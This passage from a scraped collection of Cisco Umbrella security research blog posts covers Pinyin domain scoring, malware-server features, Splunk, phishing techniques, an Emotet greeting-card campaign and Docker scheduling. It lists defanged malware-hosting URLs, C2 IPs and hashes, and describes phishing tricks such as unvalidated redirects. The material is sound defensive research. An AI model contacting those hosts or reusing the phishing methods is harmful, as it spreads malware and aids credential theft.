0.002330363 shcpdz.com. 0.002292495 lazxyl.game722.net. 0.002288849 www.ruidi.net. 0.002284677 gregoryaugustine.com. 0.002279901 www.renmaiku.com. 0.002269117 www.saintaugustinehyundai.com. 0.002247514 www.shaolindizi.org.cn. 0.002247355 6796.huhwa.com. 0.002246984 www.jkhyy.com. 0.002224344 sendai.rumotan.com. 0.002222603 club.in2underwear.com. 0.002214117 gztica.com. 0.002199464 securec28.ezhostingserver.com. 0.002191123 bjftzz.com. 0.002191085 bake-line.com. 0.002186827 jameshandlon.com. 0.002175567 www.hwz9.com. 0.002175143 www.chongshengtz.com. 0.00216471 deewallacestone.com. 0.002154474 mail.amazproduct.com. 0.002148831 vod2.igoldengate.com. 0.00213926 emilyratajkowski.org. 0.002139205 www.bahar-narenj.com. 0.002130782 programinvestasisedekah.com. 0.002129508 njqrky.com. 0.002126455 qe3ri.ggdsaeff.com. 0.002118777 baijialeyingqianjueqiao.jychenlong.com. 0.002116435 tongji.wrating.com. 0.00211354 www.footwearjapan.com. 0.002108889 staugustineinvestmentmanagement.com. 0.002108422 dww.xiagc.com.cn. 0.002106417 xbojzk.shemeshop.net. 0.002105211 realgecko.com. 0.002096769 85609.gpxuu.com. 0.002095043 marketdigitalproducts.com. 0.002093682 www.tagless.hk. 0.002088241 cha8i.ifuhxcn.com. 0.002087579 bilishi.2723397.biz. 0.0020853 fltportal.gefleet.com.gtm.ge.com. 0.002081435 mytamilchannel.com. 0.002081435 tu-demounstable-fe.transformersuniverse.com. 0.002081435 xifusheng.com. 0.002065535 13988880001.diwudai.com. 0.002059709 fucai3dlecaiwangzhai.gdlshb.com. 0.002059691 hutongyouwu.com. 0.002059615 gledainajivo.com. 0.002057547 asiri.blogfa.com. 0.002049428 www.yijee.com. 0.002047796 qiahe.net. 0.002042158 marikanasettlement.net. 0.00203916 cd581.gotoip.net. 0.002036992 sparktheevent.com. 0.002029098 www.shhweijia.com. 0.00202101 algerie360.goodbarber.com. 0.00201951 ridethebattle.com. 0.002017048 www.shhsjzcl.com. 0.002006529 www.htcaijing.com. 0.00199344 liuhecaitemacaituwangzhi.d3-w.com. 0.001992571 nj005.zapto.org. 0.001992072 www.tecnostamp-usa.com. 0.001985682 www.bjnahan.net. 0.001984731 qilei.org. 0.001984712 sundragonpress.com. 0.001981217 richmobi.com. 0.001978547 hfyyx.com. 0.001977105 www.concretehr.com. 0.00197698 www.touziqun.com. 0.001975886 wr2um.dycz123.com. 0.001974865 sdykpx.com. 0.001973644 www.bjxcyangdianfeng.net. 0.00197189 07esf.ewzmzgo.com. 0.001966409 www.qihuatong.org. 0.001965642 portsideview.com. 0.001964235 www.cncb.org. 0.001962655 g8ozi.nccpj4.org. 0.001961915 flashvid.dtiblog.com. 0.001959971 www.usapolomalls.com. 0.001959511 22qjz.ejcsjp.com. 0.001958841 rugseattle.com. 0.001957529 nataliakhodakova.com. 0.00195524 en.ex-silver.com. 0.001954879 macerc.org. 0.001954365 fs2.catr.uuzuonline.net. 0.001953869 antennasbest.net. 0.001953253 duncancomics.com. 0.00195054 929.78pfy.cnironfx.com. 0.001947731 mx01.deutsche-annington.com. 0.001944194 mx02.deutsche-annington.com. 0.001944194 www.drhouseitalia.altervista.org. 0.001943243 pastariagranditalia.com. 0.001943243 photourl.carbase.com. 0.00194233 f6byi5.ufc155.org. 0.001938265 hongjiu.ytredwine.com. 0.00192949 prestigegoodyearandautomotive.com. 0.00192883 kedimama.com. 0.001927289 74081.jyijfm.com. 0.001926884 wsdbdszmdd.bsjhjj.com. 0.001922105 as5400-s01ss7a-188.cnt.entelchile.net. 0.001920853 www.deertex.com.tw. 0.001919265 aip2.charolaisusa.com. 0.001919146 s2103.wartune.r2games.com. 0.00191781 www.phonerator.com. 0.001916443 ep.geely.com. 0.001913873 e51cv.ekiwi1.cn. 0.001913536 3g.rsdlyj.com. 0.001913271 628jr41e452.ipcheker.com. 0.001912738 inter-hosfair.com. 0.001910439 lokjv.sweatwerks.com. 0.001910439 killer.51netu.com. 0.001910439 jrtrohmregister.com. 0.001910439 deervalleypress.com. 0.001910423 s162-237-30-96.ssvec.az.wi-power.com. 0.001910423 pictures.comunpoisson.net. 0.001909499 t.jschina.com.cn. 0.001908993 www.asaska.com. 0.001908888 5402.grwjm.com. 0.001908511 terinamg2272.edublogs.org. 0.001907519 www.zdmoz.com. 0.001906594 www.2012synchro.com. 0.001903092 mchenrychamberofcomm.chambermaster.com. 0.001903076 baycity.infellowship.com. 0.001902937 friarsclubinc.org. 0.001901911 lgoc66.hnja.in. 0.001900581 www.gzcyts.com. 0.001900071 www.diweiylc.com. 0.001899941 helpcenterofaustin.org. 0.001896461 www.muziu.com.tw. 0.001895981 mail.pdsdallas.com. 0.001895747 www.qileke.com. 0.001895471 huutokaupat.com. 0.001894685 woodysoutdoorpower.com. 0.001894518 jrtcgb.webs.com. 0.001894026 846.guzcz.com. 0.001893962 yhylc.qvpzyjp.com. 0.001893881 diginyomda.com. 0.001892797 baexxxtu.97cr.cc. 0.001892075 idiyhandmade.com. 0.001891516 voyeur-reviews.info. 0.001891107 dns.ausnutria.com. 0.001891087 amfriendsaugustine.org. 0.001891071 ymgf1.yimoe.com. 0.001890908 nmd54093f.nike-hi.net. 0.001890762 www.yeyouwo.com. 0.001890102 pifaweb.com. 0.001889254 www.techtwomd.com. 0.001888793 special.bydauto.com.cn. 0.0018877 xn--gmil-1na.com. 0.001887693 bestsupply.info. 0.001887686 grandhotelpylypets.com. 0.001887686 603.lfegg.gbfgh.com. 0.00188764 sn-zc.com. 0.001887495 mdiwestziyu1.com. 0.001887482 pt.invoicexpress.com. 0.001887466 i1kjj.kdrnwj.com. 0.001887241 medals4mettle.org. 0.001886969 yierbokaihu.sdqdyt.com. 0.001886396 sdhxhjt.com. 0.001886379 dyn-dsl-mb-98-124-25-213.nexicom.net. 0.001886222 dyn-dsl-mb-98-124-28-108.nexicom.net. 0.001886222 dyn-dsl-mb-98-124-28-62.nexicom.net. 0.001886222 dyn-dsl-mb-98-124-28-231.nexicom.net. 0.001886222 jmyd0.86fashion.net. 0.001885849 pupupuooj.dtiblog.com. 0.001885539 weuee.com. 0.001884683 t080.ltkmoijl.com. 0.001884524 doomedtoexist.com. 0.001884069 ovzxmpeh.seedy123.com. 0.00188292 zerko6.edublogs.org. 0.001882789 pro-dvizh.com. 0.001882402 xntzdb.com. 0.001882102 nzw.3721job.net. 0.001881729 bazartdugrandjas.com. 0.00188146 2012napabasuperregional.apalanjevents.com. 0.001881036 jinkadaishan.flxc.net. 0.001880306 blog.webnots.com. 0.001880198 tjfate.com. 0.001880169 rutrackercat.org. 0.001880153 dqzmyq55.proveke.com. 0.001879243 selectionat.com. 0.001879227 a5sfp.13813.ejewxzg.com. 0.001879131 sbcz.net. 0.00187871 www.sdyjsw.com. 0.001878593 190.70k3l.njrcrx.com. 0.001878218 cxddz.com. 0.00187805 kdeopen.com. 0.001878039 emmtx.cn. 0.001877706 17yy.org. 0.001877573 deehtya.w4fa.com. 0.001877527 xeaa5.shgkv.com. 0.001877521 www.shgzbb.com. 0.001877521 bzlhg.com. 0.001877505 shjtjd.com. 0.001877362 4017.pjbct.com. 0.001877235 www.flurkapelle-boedigheim.com. 0.001877145 www.bestbestinmarket.com. 0.001877129 9dmz0.dwwmswu.com. 0.001877124 hmztv.com. 0.001877108 3ps6i.cj9.in. 0.001876959 815.olukq.qlk668.com. 0.001876933 qlyewu.com. 0.001876917 www.mamaspeaks.com. 0.001876836 zgt6w.ambjlqxw.com. 0.001876816 1mx9a.gvlzei.com. 0.001876629 58349.czxzdt.com. 0.001876173 418.bsjsvq.com. 0.00187617 mnjjr.com. 0.001876132 142.tellht.com. 0.001876081 tpdbv.ebboedmre.com. 0.001875687 sztlqm.com. 0.001875611 xplr-ts-t11-208-114-155-51.barrettxplore.com. 0.00187541 www.xn--mgbebn2h.com. 0.001875212 021vod.com. 0.001875187 xn--q9js9lqa9fj4fn90ata.com. 0.001875184 xn--cckl0itdpc9763ahlyc.cc. 0.001875184 Conclusion: Overall, the algorithm was successful in being able to identify Pinyin domains in our DNS query traffic. For testing, we ran the filter continuously on traffic samples from our resolvers and were able to come back with successful results. In addition, we used the cosine distance algorithm to test the accuracy of the algorithm. When testing against a few different domain corpuses (French, English, Spanish, Russian, German), the Pinyin one came back with the closest match. Overall this helped the Security Research team sift through domains faster – and in some cases be able to identify new malicious Chinese domains. Some additional features we’d like to add include improving smoothing (for grams with 0 probability) and weighting (features, and possibly grams). We also want to try and detect different types of anomalies that deviate from the norm, for example, Pinyin language in a domain that ends in .eu. Some future ideas for this project would be to expand the corpora to support multiple languages in addition to Pinyin. As a part of this research we have decided to publish the code for the Pinyin Language Detector on our public GitHub page at https://github.com/opendns/PinyinDetector .", "date": "2014-10-16"},
{"website": "Cisco-Umbrella", "title": "Crime scene evidence of an infected site: Predicting malware by examining server software", "author": ["OpenDNS Security Research"], "link": "https://umbrella.cisco.com/blog/server-side-software-and-malware-analysis", "abstract": "Every day, OpenDNS discovers thousands of websites serving malicious content, by harnessing massive amounts of DNS data. Besides what DNS level data can tell us, examining the type of server software cybercriminals use also helps increase the accuracy of our algorithms. In this experiment, we collected 50,000 domain names that have been actively serving malware between March 6th and June 6th, and 50,000 popular domain names that we never saw involved in malicious activities. In all the following charts, the inner ring represents malicious domain names, whereas the outer ring represents data from supposedly benign domains. Web server software As of today, Apache remains the most popular web server software, though Nginx is clearly on the rise. That said, malicious domains run Apache more often (62.88%) than benign domains do (41.64%), when compared to Nginx it’s more the opposite (10.87% versus 26%). Another interesting observation is, compared to malicious domains, benign domains clearly tend to obfuscate or hide the server software they are running. Our data show that malicious domains typically use one of nine different “Server:” header signatures. A staggering 95.27% of domains serving malware match these signatures, whereas benign domains match the same signatures only 17.23% of the time. Some websites are also taking advantage of Content Delivery Networks (CDNs). However, we couldn’t find any domains currently serving malware using Akamai, Bitgravity, Cachefly, Chinacache, or Limelight. Though it’s not inconceivable, one can assume that websites using one of these CDNs are much less likely to be malicious. However, 0.2% of malicious domains are using Cloudflare, and 0.1% of them were using Microsoft Azure. X-Powered-By header The next thing we examined was the “X-Powered-By” header, which is also an identifier for the software running a web application or site. Although the difference is not significant, Plesk is found more often on compromised websites than benign ones (5.67% vs 1.49%). But perhaps most important to note here is the presence of a “X-Powered-By” header which doesn’t indicate the presence of Plesk, ASP, or PHP. Web servers running Ruby (Rack), NodeJS (Express), Mono, and Java-based application servers (Jboss/Tomcat) are clearly less used for malware distribution than other software stacks. Cookies Cookies are a good indication of whether a website needs to somehow track a user, and also a good indication of what framework or application is running. In order to ignore cookies sent by third-party services, like ad servers, we only analyzed the home page of each website, and discarded cross-domain content. Approximately half of the visited benign websites don’t serve any cookies. Compare that to 77.58% of malicious websites that don’t serve cookies. Benign websites also tend to have a higher diversity of cookie names than malicious websites. This can be partly explained by the fact that cybercriminals will often target applications that are easier to compromise, and hosting services that are malware-friendly often offer similar operating systems and software stacks. WordPress Not all WordPress instances are sending cookies at the first visit. A more reliable way to detect sites powered by WordPress that inspect cookies is to look for specific files. The one tested here is /wp-includes/wlwmanifest.xml. According to this test, no less than 19.50% of malicious/compromised sites are running WordPress. But WordPress is also omnipresent on sites that haven’t been compromised (yet): the file was also found on 13.92% of the benign web sites from our training set. Last-Modified Looking at the “Last-Modified” header when requesting the home page is a good way to see whether a website is regularly updated. Plotting the CDF of both classes of domains shows that sites whose home page hasn’t been recently updated have a higher likelihood to be malicious or compromised than sites containing more dynamic content. Content-Length The length of the content is also a useful feature. I examined HTML code for the home pages only of these sites. In this training set, none of the benign examples served HTML code larger than 2 Mb on the home page, at least according to the Content-Length header. Large HTML code was always found on sites directly serving malware payloads, and on compromised sites, serving obfuscated Javascript leading to an exploit. A few examples as of today: hxxp://portail-bassin-arcachon.com 11,255,479 bytes\nhxxp://portail-cote-azur.com 9,542,640 bytes\nhxxp://location-mer.eu 8,437,761 bytes\nhxxp://portail-cote-vendeenne.com 6,934,555 bytes\nhxxp://portail-toulousain.com 6,914,263 bytes\nhxxp://grupokarion.com 6,272,172 bytes\nhxxp://portail-sologne.com 6,079,756 bytes\nhxxp://unoshn.com 4,373,545 bytes\nhxxp://portail-vallee-des-rois.com 4,355,293 bytes\nhxxp://lacajareiki.com 2,854,292 bytes SSH More than 20% of web servers are also running an SSH server on the same IP address. This holds true both for benign and malicious servers. FTP The figures are quite different when it comes to FTP servers. No less than 36.65% of web servers serving malicious content are running an FTP server. That’s nearly twice as much as servers for which we didn’t observe any malicious activity (18.57%). In both cases, Pure-FTPd is the most popular FTP server software, with a 46.5% share, mainly due to it being shipped with Cpanel. POP A POP server usually doesn’t share the same IP as a benign web server. Only 13.3% of benign web servers are also listening to port 110. However, POP servers run simultaneously on 23.15% of malicious web sites. The distribution of the POP server software is similar in both benign and malicious cases, with Dovecot being by far the most popular option. SMTP As expected, SMTP servers also tend to be more frequently found on web servers hosting malicious content than on benign ones: 25.03% vs 17.49%. Using this data for classification After analysis, we then used this data to extract simple binary features: Server: *Apache* Server: *nginx* Server: !*(IIS or Apache or Nginx or Litespeed or Oversee or Lighttpd or ATS or Varnish or Tengine)* Server: *Akamai* X-Powered-By: *(Plesk or ASP or PHP)* The presence of cookies Set-Cookie: *(wordpress or ci_session or uid or PHPSESSID or PHP_SESSION_ID or virtuemart or VisitorID)* Last-Modified date > 1 day Content-Length >= 2,000,000 The presence of an FTP server The presence of an SSH server The presence of an SMTP server The presence of a POP server A decision tree trained with these features on 2/3 of our examples leads to the following ROC curve: This classifier is simple and extremely fast, but it clearly doesn’t perform well enough on its own for our security needs. Furthermore, collecting test data is a network-intensive operation. However, we have many models currently tagging domain names as suspicious or not according to different algorithms. Some of these domains have a very high precision and are added to the list we are blocking after a quick manual review. For instance, newly registered domains acting as fast-flux fall into this category. Output of other models need extra votes before we are confident enough to blocklist them and thereby protect our customers. And this new classifier is going to play a significant role in this regard.", "date": "2013-06-13"},
{"website": "Cisco-Umbrella", "title": "Big Data Driven Security with Splunk", "author": ["OpenDNS Security Research"], "link": "https://umbrella.cisco.com/blog/big-data-driven-security-with-splunk", "abstract": "In order to deliver predictive threat protection to our customers, the Umbrella Security Labs research team has to collect and correlate data from various sources in innovative ways. We’ve shared in previous posts how our team applies proprietary algorithms to data from the OpenDNS Global Network, but we’re constantly on the hunt for  easy-to-use data platforms that allow for real-time and interactive data visibility. That’s why we wanted to share a bit about our experience with Splunk, a big data management system that provides fast machine data parsing, indexing, searching and data analyses. The GUI interface, dashboard and availability of security-related add-ons make for a neat out-of-the-box solution for enhanced data visibility. Splunk Basic Usage Installation of Splunk base is rather straightforward. Check out their official docs for installation instructions. When you’re getting started, these are some of the basic ways to use Splunk: add data to splunk (data input), search, delete, data aggregation, data transformation, and charting . If you’re using customized data, you’ll likely find input to be the trickiest part. That’s where Splunk will have to figure out the correct data format, and properly parse it to extract fields. Splunk tries to automatically break the raw blob of textual input into EVENTS based on default or customized event breaking settings, and recognize the timestamp for each event. These settings can be customized both via Splunk GUI or command line interface (CLI). Make changes props.conf file to tell Splunk how to treat your data with correct configurations. An example of extracting tab delimited fields from my input data: For data queries and other operations (aggregating, data transforming etc.), Splunk’s pipe syntax seems pretty straightforward. The following query that maps out a number of IP addresses that fits certain criteria serve as a good example of basic query syntaxes. The example requires the geoIP mapping app provided by Maxmind, and amMap, a mapping app. sourcetype=mute* | rex \"(?d+.d+.d+.d+)\"| search ip!=192.168* ip!=0.0.* ip!=10.*|  stats count by ip | eval count_label=\"Event\" | eval iterator=\"ip\" | eval iterator_label=\"IP\" |  eval zoom = \"zoom=\"334%\" zoom_x=\"-128.58%\" zoom_y=\"-113.11%\"\"| eval movie_color=\"#FF0000\" | eval output_file=\"home_threat_data.xml\" | eval app=\"amMap\" | lookup geoip clientip as ip | search client_country!=^$ | mapit Splunk data forwarding and receiving Install the universal forwarder if your have remote data. The universal forwarder gathers data from servers where your input data reside and forwards them to your main Splunk server for indexing and searching. ./splunk add forward-server [splunk server:port] /opt/splunkforwarder/bin/splunk add monitor /path/to/app/logs/ -index main -sourcetype %app% At the same time, enable receiver – the main Splunk server and indexer by going to Splunk GUI, in forwarding and receiving->add new -> TCP port [port] To troubleshoot the deployment, check these internal logs at the receiving indexer: $SPLUNK_HOME/var/log/splunk/splunkd.log $SPLUNK_HOME/var/log/splunk/license_audit.log Use cases for Splunk security apps Splunk base has a set of charting choices. In the following example, we made a pie chart of user agent distribution of our mobile clients data. Snort app has been a great tool for quick network threat monitoring and alerting. We can easily retrieve all the entries that triggered snort, and perform in-depth investigations given the source IP addresses and contextual network data. Snort and amMap makes use of Maxmind’s geo-ip mapping to give us an instant global look at the threat’s scale and spreading patterns. Conclusion We have yet to explore Splunk’s other interesting capabilities, such as real-time correlation making and alerting, or its distributed system deployment scheme (with Hadoop integration). We’ve spent lots of time with Hadoop and Hbase, which are largely back-end systems. As far as our primitive use of Splunk goes, it seems to serve quite well as a front-end portal for internal search, query and reporting. Data parsing for customized data is not as intuitive. It would be great if it provided pipe-like syntax for data input, as well.", "date": "2013-05-24"},
{"website": "Cisco-Umbrella", "title": "Changing the Standard of Phishing: Attack Trends,Tips and Tricks.", "author": ["Artsiom Holub"], "link": "https://umbrella.cisco.com/blog/changing-standard-phishing-attack-trendstips-tricks", "abstract": "As Old as the Hills Phishing attacks are well known and still the most popular and most successful type of attack used by cyber criminals. The design remains to be simple, as this attack is aimed at the most vulnerable components of information systems – the users. Startups launching Initial Coin Offerings are experiencing an increasing number of phishing attacks. As a result of these attacks, we see multiple reports in which invested funds have been lost in recent days. Until recently, most of these attacks were delivered through spam messages with a majority of the attacks halted at the user’s inbox. In some cases the messages will be ignored because the signs of phishing are very obvious. Other times, the messages are forwarded to I.T support with the question “Is it safe to enter a password on this page?”. Of course, some of these users will be successfully phished, but the number is quite small compared to the amount of spam sent. In a recent incident in which the Coindash website was hacked, the attack involved tricking users to send funds to an address that the company has identified as belonging to the hacker. There are also new attacks against crypto currency users through the Slack platform. We’ve seen recent spearphishing attacks contain no links or exploits in the message body. Instead there is only a title/subject and googling this title leads to an exploit site . All of these show how fast new phishing attacks are emerging among malicious actors. At Cisco Umbrella, one way that we’ve been monitoring emerging attacks and new trends is by using NLP Rank . In this blog post, we’re sharing some of the latest detected threats. An Old Dog Learns New Tricks Punycode encoding One trend is the use of punycode characters to encode internationalized domain names to impersonate well known domain names. We’ve seen this technique in the past before it has gained the recent wide adoption by malicious actors. The use of an additional OCR based filter has helped us to recognize suspicious domains names once the suggested block appears as a result of NLP based analysis on the domain name and it’s content. Free domain names Most of these abused domains are from TLDs that offer the domains free of charge. In this scenario, it’s not the price, but instead it’s the opportunity to get the domain name without leaving any trace in the form of payment information that is important. All you need is an email address that can later be discarded, and that’s it. Similarly, bullet proof hosting or abused large providers have been used. In the example below, trying to register spoofing domain for one of the Ethereum wallet providers, we can see domain name myetherwallet[.]cf is already taken. Compromised and Obfuscated Emails Used for Registering Since setting up multiple emails for domain registration can be difficult, we often see compromised email addresses are used for registering domains. Another trick is to have one email for registering multiple domains and replace or “guard” such email addresses with different whois data anonymity services. In these cases, the whois provider will return a message similar to: “Due to restrictions in the Privacy Statement, personal information about the user of the domain name can not be released.” Services that allow users to register absolutely anonymously, such as Protonmail, are being abused for this technique. SSL certificates and free hosting In general, people still think that the combination of HTTPS+SSL means the domain is trustworthy. In reality, this only means that your connection is private and that the traffic is protected while in transit. Another false belief exists that it is impossible to get a web server with a valid ssl certificate from CA, and leave no traces. As it turns out, this is not true. In many cases, the attackers are taking advantage of free SSL provided by hosting providers. A brief analysis of the available functions of a free package from SSL service providers reveals a storehouse of opportunities which can be abused by phishing actors: Completely anonymous registration. Any valid email address is more than enough. Theoretically, an identity can be found from the analysis of the IP address used for registration, but sophisticated attackers are more than capable to hide their true IP address. Abused free certificates from CAs. Some of them are not only free, but are also issued within a few minutes of registering, without any additional verification being performed. The real IP address of the web server is hidden. All traffic goes through a CDN like infrastructure. SSL offloading. A malicious web server can be configured to work with http, but with a service like Cloudflare, all of the traffic will go through SSL. This is important because you can easily get free hosting with HTTP, whereas you would have to pay for hosting with the HTTPS and SSL-payments, and this can be traced. With rare exceptions, CA services do not sign certificates for domains at .ga, .cf, .tk, etc. And once again Cloudflare-like services solve this problem for the attacker, with the ease of which the certificate is issued. Ads Poisoning While AdWords phishing is not a new threat, it is one of the most used in the case of phishing cryptocurrency users, as well as other financial institutions. Google and Bing are aware of the malicious use of their advertising platforms, but recent campaigns have proven that these attacks are frequently able to surpass detection. We observed the below campaign over the past 6-9 months. There are targeted companies that rotate through the campaign duration but the rest of the scheme stayed the same. This type of campaign has been covered in detail in our previous publications . The latest iteration of this campaign targets users of MyEtherWallet . Malicious ad Spoofing malicious domain Unvalidated Redirects Phishing emails are getting better and using a lot more targeted social engineering tactics. We have analyzed links within phishing emails that would at first not seem to be malicious or be an attempt at phishing. However, the link leads to a compromised website, that makes us of an “Unvalidated Redirects” vulnerability. The exploitation of this vulnerability helps to defeat many, if not all of the anti-spam filters commonly used. In an email the link would appear similar to: hxxps://company.com/unvalidated_redirect.php?url=http://login.company.cf/ The user sees the link directing to the original trusted site (company.com) and does not realize the redirection that could take place Abuse of  URL shorteners In recent mass spam campaigns, we have seen a surge in the use of  shortened url links in the e-mail body to drive traffic to spoofed domains. Once again this technique helps to defeat a significant amount of standard defenses and creates problems for typical users. Many people believe the responsibility rests on the URL shortener’s shoulder’s to guarantee safety of a shortened link. While many URL shorteners are working to decrease malicious links in their system, to totally eliminate such abuse is a very challenging problem. These schemes typically aim not only to harvest account credentials, but also used to deliver malware . Defeat the Phish How do we take down malicious domains? It is the goal of many security researchers in our industry, but a unified solution does not yet exist. Conviction and punishment of the suspected phishing actor seems to be a hard goal to achieve. With the given complexity of the malicious infrastructure behind these attacks, a researcher would need to work in close collaboration with the Registrar, Cloud Service Provider, and the Email Service Provider being abused to find the actor behind such attacks. However, this approach could still leave you with only an IP address as an indicator. How would it be possible to “identify” a criminal by only their assumed IP address? I would say impossible. Visualization of malicious spoofing domains Conclusion Given the research being done to identify the scale of the problem behind simple typosquatting domains, we can see there are many users exposed to this threat. The amount of phishing attacks is growing and the criminal’s methods are constantly evolving. Cisco Umbrella is able to detect and block such domains using our high frequency classifiers like NLPRank. Additionally, user’s and companies themselves are strongly encouraged to enable two-factor authentication when possible and implement layered security controls. IOCs This blog is a result of collaboration between Artsiom Holub of Cisco Umbrella research team and Jeremiah O’Connor of Cisco country digitization team.", "date": "2017-08-10"},
{"website": "Cisco-Umbrella", "title": "Belated Christmas Greetings from Emotet", "author": ["Andrea Kaiser"], "link": "https://umbrella.cisco.com/blog/belated-christmas-greetings-emotet", "abstract": "Emotet is a trojan that steals financial information, AKA, “Banking Malware”. Trojans give cybercriminals a backdoor to systems, making it possible to spy on confidential information like banking credentials and to exfiltrate data. In order to get a trojan onto a system, an attacker will want to disguise it as something else. Once the Christmas holiday season rolled around, the malicious actors behind Emotet started sending out some unwanted gifts to email inboxes. The emails appear to be wishing you a Merry Christmas and sending you a holiday gift card, or an E-card greeting. They include a link that downloads a malicious word document and if macros execute, the Emotet trojan is downloaded to the system. The link leads to a compromised website. The URIs in the links have been similar to “Your-Holiday-Gift-Card”. The downloaded document will be named something similar. We’ve seen the malicious actors continue to use this tactic since Christmas, and on into this week. The various URIs we have observed: /Your-Holidays-eCard /Gift-Card-for-you /eGift-Card /Happy-Holidays-Card /Your-Gift-Card /Christmas-eCard /Your-Christmas-Gift-Card /Holidays-eCard /Gift-Card /Your-Card /eCard Re-Gifting Throughout 2017 Emotet relied on spam messages that included attached malicious word documents of fake invoices from various companies and sometimes “voicemail” attachments. It then evolved to contain links in the message body that lead to the download of the word document. The invoice tactic contains URIs on compromised sites using words similar to: /Invoice /Overdue-payment /Final-Account /Invoices-attached /Invoice-01075710 This URI pattern works to look legitimate to individuals that deal with accounts payable, shipping, finance, etc. Someone that deals with many invoice requests in a day may not find the type of attachment or download out of the ordinary. Unwrapping the Gift Document download: http://www[.]jackbenimbleonline[.]com/Gift-Card-for-you Hash: 6e4a276dd2d745f57faa6e18ba90e255836ef4976c65cdfd831412b8ae4ab91c C2: 178[.]32[.]255[.]132 The macro included in the word doc executes a powershell script that downloads the payload. The emotet banking trojan is downloaded and often times additional malware. The powershell script is obfuscated, but with some effort we can find the possible URLs that will be contacted to get the payload. Obfuscated VBA Macro Obfuscated URLs from Powershell script After Deobfuscating The Reason for the Season Many of the compromised sites were running outdated WordPress versions 3.5 through 4.7 which has multiple vulnerabilities where attackers can inject malicious script and html, compromising the site. A few of these compromised sites appeared to have tried to clean up and failed. One of the compromised sites seems to have performed a WordPress upgrade without removing the infected URLS and a SEO spam infection, showing a lingering security problem. The latest URLs that we have seen hosting the malicious doc files: http://jackbenimbleonline[.]com/Gift-Card-for-you http://bezbarier[.]wasko[.]pl/Your-Holidays-eCard http://raymain[.]co[.]uk/Your-eCard/ http://www[.].sodocimeb.com[.]do/Your-Christmas-Card/ http://www[.]forenadebolag[.]se/Your-Holidays-eCard http://www[.]join[.]us/Your-Holidays-eCard http://www[.]sdkhunter[.]com/Gift-Card-for-you http://sacrafamigliatrento[.]it/Gift-Card-for-you http://m-onefamily[.]com/components/eGift-Card http://usammm[.]org/eGift-Card http://www[.]twitchsleep[.]net/Happy-Holidays-Card http://www[.]queenstreetlaundry[.]com/Your-Gift-Card http://vmediaacademy[.]com/Christmas-eCard http://circadianpulse[.]com/Your-Christmas-Gift-Card http://hotelpetresort[.]com/Holidays-eCard http://wallhult[.]se/Holidays-eCard http://ortospinecenter[.]com/Gift-Card http://qttctc.edu[.]vn/Gift-Card http://www[.]simonedipasquale[.]com/Gift-Card Associated Hashes: 6e4a276dd2d745f57faa6e18ba90e255836ef4976c65cdfd831412b8ae4ab91c 314534b97bbe3cf2d71e95234c1fe8e5079e8fc3792d237c62d713d83c2bf50e Ce0c66e61a98e7517e3c496e077ed07783d26a7994ec39010e258c4fd7d01ea9 B051137a784c2f67be25b55b4ec61362720bb12a909c99da6b967922faa2646b a77e40b03e814c6f554929a939839416d80f73228a123ab953be37a1f25780b5 D038049d22c876e826cf41e0f69089d9a01654f48790c53202cbfa98bcf8c6eb 87dc2f7b36c4423f641516068c94feb3c9a634fbaa9196244cbf03bed8f2c85a 43e7bcef39f88ca7d3b9b67d09f9264c4946e0e12a337c23e043bb8e9f634c2e 6e2460dab20fcca216798641dfa821e73b5bccf510df487839f542a198740778 F9cf6788755dc5f82017e62b08f8f36eaf92806de4c89110207a13da27d7529f C412ad121682d33210402955ad330fbd182c5c57155bab2db659c7557d4a417b A8c75f9b1e601c4c77b67ddd1bdb28bf9164c4f507b9530fa31861f2c72fb2d7 D007c2ec4483fcd4dbf67233956b194d3a3a46426f700282ea7b01785a10fc50 Dcab1d68887140ae7597993d166babeb0792f12ef9388e5cab89e9f4ee4b329f Fba9ba4112dacc745d951a00f20c1e967bf78cbb318e947d695f08c42fb588c2 C2 servers observed in the samples: 91[.]121[.]45[.]118 49[.]212[.]135[.]76 195[.]154[.]58[.]200 65[.]44[.]220[.]49 178[.]32[.]255[.]132 212[.]5[.]159[.]61 Cisco Umbrella will continue investigating these “gifts” in order to block new malicious infrastructure used by cybercrimminals as they continually change their tactics.", "date": "2018-01-09"},
{"website": "Cisco-Umbrella", "title": "Docker Container Scheduling as a Bin Packing Problem", "author": ["Philip Thomas"], "link": "https://umbrella.cisco.com/blog/docker-container-scheduling-as-a-bin-packing-problem", "abstract": "For the internal OpenDNS engineering hackathon earlier this month, I used data from our Quadra system to develop a Docker container scheduler. The tool combines historical data about container resource consumption with a mathematical model to best decide which host should run each container. This formulation is a type of bin packing problem , and I used the JuliaOpt project’s JuMP package to formulate the solution in the Julia programming language . Problem Statement Given pools consisting of a quantity of identical Docker containers, each with known historical memory, CPU, and network I/O usage, and given a finite number of hosts each with known memory, CPU, and network I/O capacity – assign each container in a pool to a single host. The sum of memory and network I/O of the containers on the host must be less than its capacity. Because it is the main resource constraint for hosts, minimize the expected CPU usage on each host. In addition, attempt to keep different containers from the same pool on different hosts to create redundancy. Data Collecting historical data about the resource usage of each container proved to be the most time-consuming portion of the process. The Quadra system logs resource consumption for each container in InfluxDB . So, my hackathon project starts by using this API to get a list of currently-running containers and their resource consumption over the last hour. Data about running Docker containers is accessible through the Docker Stats API introduced in v1.5.0 or by using cAdvisor . Resource consumption by containers tends to be highly variable. For some pools, such as web apps, traffic changes proportional to web visitors throughout a day. For pools used by headless browser tests, resource consumption is often low with periodic bursts in CPU. Staging environments use comparatively little resources. During the formulation, I assume that the host overhead is negligible for everything but the resource consumption. Calculation The hackathon container scheduling system was written using the Julia programming language. I formulated the problem using the JuMP package from JuliaOpt . JuMP provides a metalanguage for expressing optimization problems, then passes off the actual calculation to configurable solvers. I used the open-source CBC solver from the COIN-OR project. After running the calculation, the script makes API calls to move containers between hosts. Speed This problem’s complexity is NP-Hard , so the actual calculation times with the branch and bound algorithm became infeasible for real-world use when I tested more than 200 pools of containers. Solving a small data set of 20 pools across 4 hosts took seconds, but 200 pools across 10 hosts never converged after 8 hours on my Macbook. Fortunately the algorithm is parallelizable, so it is possible to utilize all resources on a multi-core device. The calculation takes so long because it seeks a convergent, optimal solution. However, the practical application of this system means that slight variations away from the optimal solution are viable. This is due to uncertainty in the data used for the calculation and the excess capacity on each host. A way to deal with this summarized in the “Formulation” section bullet point below. Possible Improvements Data – When pulling historical data – instead of using an average, use the (average + standard deviation) or (average + 2*standard deviation) in order to account for fluctuations in container resource consumption. Formulation – Instead of treating the problem as an optimization with an objective function – treat it as a constraint programming problem. To do this in the script – set a static CPU limit, modify the constraint to be less than this variable, and delete the objective function. Applications The system is designed to run on a cron job – perhaps every hour – in order to continuously reallocate containers between hosts 